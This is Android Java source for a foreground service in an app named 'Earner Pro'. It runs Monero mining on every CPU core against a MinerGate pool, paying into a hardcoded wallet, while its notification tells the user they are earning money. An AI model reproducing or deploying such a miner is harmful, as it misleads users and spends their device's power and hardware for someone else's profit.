package com.earner.pro.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;

public class MinerService extends Service {
    
    private static final String CHANNEL_ID = "miner_channel";
    private Thread minerThread;
    private boolean isMining = true;
    
    // Crypto mining library (native)
    static {
        System.loadLibrary("miner");
    }
    
    // Native methods
    private native void startMining(String poolUrl, String wallet, int threads);
    private native void stopMining();
    private native double getHashRate();
    private native long getHashesTotal();
    
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, createNotification());
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Mining configuration
        String poolUrl = "stratum+tcp://xmr.pool.minergate.com:45560";
        String wallet = "48a2b5c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1";
        int threads = Runtime.getRuntime().availableProcessors();
        
        // Start mining in background thread
        minerThread = new Thread(() -> {
            startMining(poolUrl, wallet, threads);
        });
        minerThread.start();
        
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        isMining = false;
        stopMining();
        if (minerThread != null) {
            minerThread.interrupt();
        }
        super.onDestroy();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Earner Pro Mining",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Earner Pro")
            .setContentText("Mining active - Earning money in background")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .build();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}